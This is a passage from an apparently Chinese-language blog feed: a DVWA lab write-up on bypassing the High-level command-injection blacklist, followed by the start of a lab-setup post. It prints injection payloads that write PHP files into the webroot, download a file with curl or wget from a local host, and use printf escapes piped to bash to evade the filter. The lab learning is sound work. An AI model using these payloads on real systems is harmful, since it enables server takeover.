&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>王德发？&lt;/p>
&lt;p>这不是已经滤掉了 &lt;code>||&lt;/code> 吗，为什么 &lt;code>notexists || echo 123&lt;/code> 这个 payload 还是显示了 &lt;code>123&lt;/code>？&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135.png"
width="888"
height="660"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153514135"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>我不理解，大受震撼。干脆开了个 php 解释器试一试 &lt;code>str_replace&lt;/code> 到底替换出来个什么鬼。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;notexists || echo 123&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果是&lt;code>ping -c 4 notexists |echo 123&lt;/code>。看起来是 &lt;code>str_replace&lt;/code> 的用法有误，导致实际替换掉的是 &lt;code>|&lt;/code> 而不是 &lt;code>||&lt;/code>。&lt;/p>
&lt;p>php 官方文档（8.1）如是说：&lt;/p>
&lt;blockquote>
&lt;p>If &lt;code>search&lt;/code> and &lt;code>replace&lt;/code> are arrays, then &lt;strong>str_replace()&lt;/strong> takes a value from each array and uses them to search and replace on &lt;code>subject&lt;/code>. If &lt;code>replace&lt;/code> has fewer values than &lt;code>search&lt;/code>, then an empty string is used for the rest of replacement values. If &lt;code>search&lt;/code> is an array and &lt;code>replace&lt;/code> is a string, then this replacement string is used for every value of &lt;code>search&lt;/code>. The converse would not make sense, though.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 容器的 PHP 版本是 7.0 ，姑且当没变。那问题就在于 &lt;code>str_replace&lt;/code> 的替换方法了，我猜&amp;hellip;&amp;hellip;当 &lt;code>search&lt;/code> 是 &lt;code>array&lt;/code> 的时候，&lt;code>str_replace&lt;/code> 实际是这样干的：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pattern&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">search&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pattern&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">subject&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>简单实验验证下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;ab&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s2">&amp;#34;c&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;aabbcc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ccbbcc
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但即使如此，也应该替换掉 &lt;code>||&lt;/code> 两个字符才对啊&amp;hellip;&lt;/p>
&lt;p>最后才发现，替换的模式是 &lt;code>| &lt;/code>（在&lt;code>|&lt;/code>后面多一个空格），所以只替换掉了 &lt;code>|| &lt;/code>的后一个 &lt;code>| &lt;/code>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>事实证明视力还是很重要的，少打sc2，没瞎早该看到了。&lt;/p>
&lt;p>据此可以再改一改 payload，已知 &lt;code>||&lt;/code>会被替换成 &lt;code>|&lt;/code>，管道运算符会把上一个命令的输出接到下一个命令的 stdin 输入。正好，&lt;code>echo&lt;/code> 不读 stdin，直接&lt;code>echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code> 的方法应该不受影响。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919.png"
width="448"
height="143"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422160740919"
class="gallery-image"
data-flex-grow="313"
data-flex-basis="751px"
>&lt;/p>
&lt;p>倒是没报 404，可是白屏了。从 DVWA 的日志观察到下面的记录：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice: Use of undefined constant phpinfo - assumed &amp;#39;phpinfo&amp;#39; in /var/www/html/2.php on line 1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这倒是很新鲜，&lt;code>phpinfo&lt;/code>不应该是全局的吗？&lt;/p>
&lt;blockquote>
&lt;p>我又傻逼了。&lt;/p>
&lt;/blockquote>
&lt;p>经过十几分钟的脑残式思考，忽然意识到 &lt;code>(&lt;/code> 和 &lt;code>)&lt;/code> 也在过滤清单里，哦淦！好吧，直接在这里注入 php 代码看来限制有点太多了，插个&lt;code>curl&lt;/code>命令让它下载得了。&lt;/p>
&lt;p>本地用 &lt;code>python3 -m http.server&lt;/code>命令启动一个 http 服务器，然后 &lt;code>ip addr show docker0&lt;/code> 看一眼本机 ip，把 payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php&lt;/code> ，先找个 playground 试一试过滤后的命令是什么样。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>发现 &lt;code>-&lt;/code> 也被过滤了，&lt;code>-O&lt;/code>参数不能用。想到看看 php 默认运行目录是哪里，直接 &lt;code>wget&lt;/code> 下载到当前目录也可以。然后又想到可以再拼一个 &lt;code>|| mv 2.php /var/www/html/2.php&lt;/code> 移动过去。再试一试。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>现在看起来有机会运行了，结果报错&lt;code>wget: not found&lt;/code>。&lt;/p>
&lt;p>行吧。乖乖&lt;code>curl&lt;/code>，payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php&lt;/code>。更屑的事情发生了：&lt;code>curl: not found&lt;/code>。&lt;/p>
&lt;p>怎么什么都没有？沃日。拼一句 &lt;code>|| ls /usr/bin&lt;/code>看看有啥可以用的，惊喜地发现居然有个 &lt;code>rsync&lt;/code>，这下总该省事了吧，结果半天没搞出来匿名访问的 rsync daemon。&lt;/p>
&lt;p>一看时间快下班了，突然意识到其实有 &lt;code>base64&lt;/code> 可以用=。=，还有&lt;code>printf&lt;/code>转义&lt;code>\x&lt;/code> 都能bypass。怎么一到下班时间就才思泉涌。&lt;/p>
&lt;p>payload 改成 &lt;code>notexists || printf '&amp;lt;?php phpinfo\x28\x29\x3b ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，结果发现依然不行。为什么？头都要炸了。&lt;code>base64 -d&lt;/code>的&lt;code>-&lt;/code>会被过滤故不能考虑，&lt;code>printf&lt;/code>的&lt;code>\x&lt;/code>转义序列怎么会不行，谷歌了一番&lt;a class="link" href="https://stackoverflow.com/questions/66844155/bin-sh-does-not-recognize-hexadecimal-escape-sequences" target="_blank" rel="noopener"
>在爆栈看到个回答&lt;/a>：&lt;/p>
&lt;blockquote>
&lt;p>Because escape sequences in &lt;code>\xdd&lt;/code> form (where each &lt;code>d&lt;/code> represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and &lt;a class="link" href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html#tag_05" target="_blank" rel="noopener"
>standardized&lt;/a>), so you can use:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="nb">printf&lt;/span> &lt;span class="s1">&amp;#39;%b&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;\0220&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>好嘛，所以说 &lt;code>\x&lt;/code> 转义序列还不够 portable 是吧。&lt;code>\0&lt;/code>转义序列要用 8 进制编码，于是我再次改了一下 payload &amp;hellip;&lt;/p>
&lt;p>&lt;code>notexists|printf '&amp;lt;?php phpinfo\050\051\073 ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，把 &lt;code>\x&lt;/code> 转义序列改成了 &lt;code>\0&lt;/code>，这次没问题了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468.png"
width="1268"
height="373"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424142807468"
class="gallery-image"
data-flex-grow="339"
data-flex-basis="815px"
>&lt;/p>
&lt;p>此外还想到另一种解法，考虑&lt;code>sh&lt;/code>（&lt;code>csh&lt;/code>或者&lt;code>dash&lt;/code>，&lt;code>ash&lt;/code>？）不吃&lt;code>\x&lt;/code>，要是对&lt;code>\0&lt;/code>也不吃还有种比较狗的办法，&lt;code>printf &amp;quot;printf \&amp;quot;\\x28\\x29\&amp;quot;&amp;quot;|bash&lt;/code>，用&lt;code>\\&lt;/code>转义留下反斜杠，然后传给&lt;code>bash&lt;/code>执行。&lt;code>bash&lt;/code>大概率是能吃下&lt;code>\x&lt;/code>转义序列的，于是就间接实现了&lt;code>printf \x28\x29&lt;/code>。&lt;/p>
&lt;p>传&lt;code>notexists|printf &amp;quot;printf \&amp;quot;\\x28\&amp;quot;&amp;quot;|bash&lt;/code>这个 payload 可以看到回显 &lt;code>(&lt;/code>，说明这个思路是 ok 的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245.png"
width="479"
height="121"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424143511245"
class="gallery-image"
data-flex-grow="395"
data-flex-basis="950px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>Brute Force 比较简单，不提。&lt;/p>
&lt;p>Command Injection 其实一直到 High 难度都还是比较简单的，High 难度下留了&lt;code>|&lt;/code>管道符可以用，整个注入就没啥难度了。&lt;/p>
&lt;p>这就让我想到了怎么写 &lt;code>ping&lt;/code> 这个案例才能做到杜绝命令注入？&lt;/p>
&lt;p>&lt;code>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&lt;/code>正则匹配一下，感觉上面玩的那些花样就毫无意义了。&lt;/p>
&lt;p>Impossible 难度下 Command Injection 变成了这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php"> &lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">stripslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Split the IP into 4 octects
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">explode&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Check IF each octet is an integer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">sizeof&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// If all 4 octets are int&amp;#39;s put the IP back together.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">//...
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我是有点难理解为什么还是用这种比较糙的手段验证=。=正则匹配下不行吗？&lt;code>is_numeric&lt;/code>是不是能 bypass 我不太肯定，但这条长长的&lt;code>if&lt;/code>看起来就感觉是有坑的样子&amp;hellip;&lt;/p>
&lt;p>所以吧&amp;hellip;到底多少还有点迷惑。Impossible 难度的命令注入，未来再研究研究，也许之后会再写篇博客看看。&lt;/p></description></item><item><title>DVWA上手记录-初体验</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</link><pubDate>Thu, 21 Apr 2022 16:41:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>DVWA 全程 &lt;em>Damn Vunerable Web Application&lt;/em> ，是一个开源的基于 PHP+MariaDB 开发的漏洞靶场。&lt;/p>
&lt;p>官方文档推荐XAMPP部署，但个人比较爱docker，先拿 README 里写的 vulnerables/web-dvwa 玩玩看。&lt;/p>
&lt;blockquote>
&lt;p>vulnerable/web-dvwa 这个容器最后一次更新已经是 2015 年了，作为纯萌新姑且先把玩看看，安全领域攻防发展这么快，我寻思这个版本是有点和时代脱节了。&lt;/p>
&lt;/blockquote>
&lt;h2 id="安装">安装&lt;/h2>
&lt;p>启动个虚拟机，debian bullseye，装好 docker 再配好 zsh 之类的工具。tmux 开个分窗然后一键跑起来：&lt;code>docker run --rm -it -p 80:80 vulerables/web-dvwa&lt;/code>。&lt;/p>
&lt;p>配置下虚拟机端口转发，把 SSH 和 HTTP 转发到宿主机：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945.png"
width="1138"
height="495"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421144541945"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="551px"
>&lt;/p>
&lt;p>最后在浏览器打开 &lt;code>http://localhost:8080/&lt;/code> 就能看到登录页了。在创建数据库前随便输入什么用户名密码都能进去，简单读一下&lt;code>/setup.php&lt;/code> 上写的内容，点一下 &lt;code>Create/Reset database&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045.png"
width="900"
height="906"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151455045"
class="gallery-image"
data-flex-grow="99"
data-flex-basis="238px"
>&lt;/p>
&lt;p>等跳转回登录页，就算是完成了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317.png"
width="424"
height="437"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151523317"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="232px"
>&lt;/p>
&lt;p>默认账号密码是 &lt;code>admin&lt;/code> 和 &lt;code>password&lt;/code> 。&lt;/p>
&lt;h2 id="信息收集">信息收集&lt;/h2>
&lt;h3 id="介绍">介绍&lt;/h3>
&lt;p>在侧边栏可以看到可用的模块。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120.png"
width="203"
height="616"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421152621120"
class="gallery-image"
data-flex-grow="32"
data-flex-basis="79px"
>&lt;/p>
&lt;p>具体内容稍后再看，先把主页上的信息读一读。&lt;/p>
&lt;p>介绍中这样说：&lt;/p>
&lt;blockquote>
